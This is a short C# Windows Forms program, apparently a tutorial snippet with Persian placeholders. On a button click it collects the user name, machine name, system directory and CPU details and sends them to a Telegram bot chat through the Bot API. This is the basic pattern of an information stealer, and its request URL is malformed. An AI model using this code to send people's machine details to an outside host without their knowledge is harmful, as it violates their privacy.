using System.IO;
using System.Net;

namespace Get_System_Info
{
    public partial class Form1 : Form
    {
        string info = "UserName : " + Environment.UserName + "\n" + "MachineName : " + Environment.MachineName + "\n" + "System Directory : " + Environment.SystemDirectory + "\n" + "64 bit is : " + Environment.Is64BitOperatingSystem + "\n" + "CPU Count : " + Environment.ProcessorCount + "\n" ;
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            var url = "https://api.telegram.org/bot[توکن بات]/sendmessage?chat_id=[آیدی عددی تلگرام]=" + info;

            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;

            var request = WebRequest.Create(url);
            request.Method = "GET";

            var webResponse = request.GetResponse();
            var webStream = webResponse.GetResponseStream();

            var reader = new StreamReader(webStream);
            var data = reader.ReadToEnd();

            MessageBox.Show("Done");
        }
    }
}